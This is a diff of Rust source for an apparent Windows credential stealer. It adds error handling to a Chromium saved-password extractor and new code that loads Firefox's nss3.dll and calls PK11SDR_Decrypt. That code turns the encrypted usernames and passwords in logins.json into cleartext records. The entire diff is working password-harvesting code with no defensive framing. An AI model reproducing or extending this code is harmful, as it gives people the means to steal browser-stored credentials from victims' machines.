@@ -137,6 +137,23 @@ fn extract_chromium_passwords(source: &str, user_data_path: &str) -> Vec<serde_j
     let _ = std::fs::remove_file(&temp_db);
 
     if let Ok(out) = output {
+        let stderr_text = String::from_utf8_lossy(&out.stderr);
+        if !stderr_text.trim().is_empty() {
+            creds.push(json!({
+                "source": source,
+                "url": "error",
+                "username": "sqlite3_error",
+                "password": stderr_text.trim().to_string(),
+            }));
+        }
+        if !out.status.success() && out.stdout.is_empty() {
+            creds.push(json!({
+                "source": source,
+                "url": "error",
+                "username": "sqlite3_not_found",
+                "password": format!("sqlite3 exit code: {:?} — ensure sqlite3.exe is in PATH", out.status.code()),
+            }));
+        }
         let text = String::from_utf8_lossy(&out.stdout);
         for line in text.lines() {
             let parts: Vec<&str> = line.splitn(3, '|').collect();
@@ -147,7 +164,7 @@ fn extract_chromium_passwords(source: &str, user_data_path: &str) -> Vec<serde_j
 
                 // Decrypt password: v10/v11 format = 3-byte prefix + 12-byte nonce + ciphertext + 16-byte tag
                 if let Some(password_bytes) = hex_decode_bytes(password_hex) {
-                    if password_bytes.len() > 15 && &password_bytes[..3] == b"v10" || password_bytes.len() > 15 && &password_bytes[..3] == b"v11" {
+                    if (password_bytes.len() > 15 && &password_bytes[..3] == b"v10") || (password_bytes.len() > 15 && &password_bytes[..3] == b"v11") {
                         let nonce = &password_bytes[3..15];
                         let ciphertext = &password_bytes[15..];
 
@@ -173,6 +190,13 @@ fn extract_chromium_passwords(source: &str, user_data_path: &str) -> Vec<serde_j
                 }
             }
         }
+    } else {
+        creds.push(json!({
+            "source": source,
+            "url": "error",
+            "username": "sqlite3_missing",
+            "password": "sqlite3 command not found — install or add to PATH",
+        }));
     }
 
     creds
@@ -236,9 +260,6 @@ fn hex_decode_bytes(hex: &str) -> Option<Vec<u8>> {
 
 #[cfg(target_os = "windows")]
 fn extract_firefox_passwords() -> Vec<serde_json::Value> {
-    // Firefox uses NSS for encryption. Reading logins.json and key4.db
-    // requires NSS library calls. As a simplified approach, dump logins.json
-    // entries (URLs and usernames are in cleartext).
     let mut creds = Vec::new();
     let appdata = std::env::var("APPDATA").unwrap_or_default();
     let profiles_path = format!("{}\\Mozilla\\Firefox\\profiles.ini", appdata);
@@ -253,13 +274,32 @@ fn extract_firefox_passwords() -> Vec<serde_json::Value> {
                 if let Ok(logins_str) = std::fs::read_to_string(&logins_path) {
                     if let Ok(logins_json) = serde_json::from_str::<serde_json::Value>(&logins_str) {
                         if let Some(logins) = logins_json.get("logins").and_then(|v| v.as_array()) {
+                            // Try NSS decryption for this profile
+                            let nss_ctx = NssContext::init(&profile_dir);
+
                             for login in logins {
+                                let url = login.get("hostname").and_then(|v| v.as_str()).unwrap_or("");
+                                let enc_user = login.get("encryptedUsername").and_then(|v| v.as_str()).unwrap_or("");
+                                let enc_pass = login.get("encryptedPassword").and_then(|v| v.as_str()).unwrap_or("");
+
+                                let username = nss_ctx.as_ref()
+                                    .and_then(|ctx| ctx.decrypt(enc_user))
+                                    .unwrap_or_else(|| enc_user.to_string());
+                                let password = nss_ctx.as_ref()
+                                    .and_then(|ctx| ctx.decrypt(enc_pass))
+                                    .unwrap_or_else(|| "[nss_encrypted - nss3.dll not available]".to_string());
+
                                 creds.push(json!({
                                     "source": "firefox",
-                                    "url": login.get("hostname").and_then(|v| v.as_str()).unwrap_or(""),
-                                    "username": login.get("encryptedUsername").and_then(|v| v.as_str()).unwrap_or("[encrypted]"),
-                                    "password": "[nss_encrypted - requires nss3.dll for decryption]",
+                                    "url": url,
+                                    "username": username,
+                                    "password": password,
                                 }));
+                            }
+
+                            // Shutdown NSS after processing all logins for this profile
+                            if let Some(ctx) = nss_ctx {
+                                ctx.shutdown();
                             }
                         }
                     }
@@ -269,6 +309,106 @@ fn extract_firefox_passwords() -> Vec<serde_json::Value> {
     }
 
     creds
+}
+
+/// NSS context for Firefox credential decryption.
+/// Loads nss3.dll, initializes NSS with the profile directory, and provides
+/// PK11SDR_Decrypt for decrypting encrypted username/password fields.
+#[cfg(target_os = "windows")]
+struct NssContext {
+    _nss_handle: *mut std::ffi::c_void,
+    pk11_decrypt: unsafe extern "C" fn(*mut NssSecItem, *mut NssSecItem, *mut std::ffi::c_void) -> i32,
+    nss_shutdown: unsafe extern "C" fn() -> i32,
+}
+
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct NssSecItem {
+    typ: u32,
+    data: *mut u8,
+    len: u32,
+}
+
+#[cfg(target_os = "windows")]
+impl NssContext {
+    fn init(profile_dir: &str) -> Option<Self> {
+        use std::ffi::CString;
+        use std::os::raw::c_char;
+
+        // Find nss3.dll in known Firefox install locations
+        let firefox_dirs = [
+            "C:\\Program Files\\Mozilla Firefox",
+            "C:\\Program Files (x86)\\Mozilla Firefox",
+        ];
+
+        let nss_path = firefox_dirs.iter()
+            .map(|d| format!("{}\\nss3.dll", d))
+            .find(|p| std::path::Path::new(p).exists())?;
+
+        unsafe {
+            // Add Firefox dir to DLL search path so nss3.dll can find its deps
+            let firefox_dir = std::path::Path::new(&nss_path).parent()?;
+            let dir_wide: Vec<u16> = firefox_dir.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
+            winapi::um::winbase::SetDllDirectoryW(dir_wide.as_ptr());
+
+            let nss_cstr = CString::new(nss_path.as_str()).ok()?;
+            let nss_handle = winapi::um::libloaderapi::LoadLibraryA(nss_cstr.as_ptr());
+            if nss_handle.is_null() { return None; }
+
+            type NssInitFn = unsafe extern "C" fn(*const c_char) -> i32;
+            type Pk11SdrDecryptFn = unsafe extern "C" fn(*mut NssSecItem, *mut NssSecItem, *mut std::ffi::c_void) -> i32;
+            type NssShutdownFn = unsafe extern "C" fn() -> i32;
+
+            let nss_init: NssInitFn = std::mem::transmute(
+                winapi::um::libloaderapi::GetProcAddress(nss_handle, b"NSS_Init\0".as_ptr() as *const i8)
+            );
+            let pk11_decrypt: Pk11SdrDecryptFn = std::mem::transmute(
+                winapi::um::libloaderapi::GetProcAddress(nss_handle, b"PK11SDR_Decrypt\0".as_ptr() as *const i8)
+            );
+            let nss_shutdown: NssShutdownFn = std::mem::transmute(
+                winapi::um::libloaderapi::GetProcAddress(nss_handle, b"NSS_Shutdown\0".as_ptr() as *const i8)
+            );
+
+            // Init NSS with the profile directory (can only be called once per profile)
+            let profile_cstr = CString::new(profile_dir).ok()?;
+            if nss_init(profile_cstr.as_ptr()) != 0 { return None; }
+
+            Some(NssContext {
+                _nss_handle: nss_handle as *mut std::ffi::c_void,
+                pk11_decrypt,
+                nss_shutdown,
+            })
+        }
+    }
+
+    fn decrypt(&self, encrypted_b64: &str) -> Option<String> {
+        if encrypted_b64.is_empty() { return None; }
+
+        let encrypted_bytes = base64::engine::general_purpose::STANDARD.decode(encrypted_b64).ok()?;
+        if encrypted_bytes.is_empty() { return None; }
+
+        unsafe {
+            let mut input = NssSecItem {
+                typ: 0,
+                data: encrypted_bytes.as_ptr() as *mut u8,
+                len: encrypted_bytes.len() as u32,
+            };
+            let mut output = NssSecItem { typ: 0, data: std::ptr::null_mut(), len: 0 };
+
+            let result = (self.pk11_decrypt)(&mut input, &mut output, std::ptr::null_mut());
+
+            if result == 0 && !output.data.is_null() && output.len > 0 {
+                let slice = std::slice::from_raw_parts(output.data, output.len as usize);
+                Some(String::from_utf8_lossy(slice).to_string())
+            } else {
+                None
+            }
+        }
+    }
+
+    fn shutdown(self) {
+        unsafe { (self.nss_shutdown)(); }
+    }
 }
 
 #[cfg(target_os = "windows")]
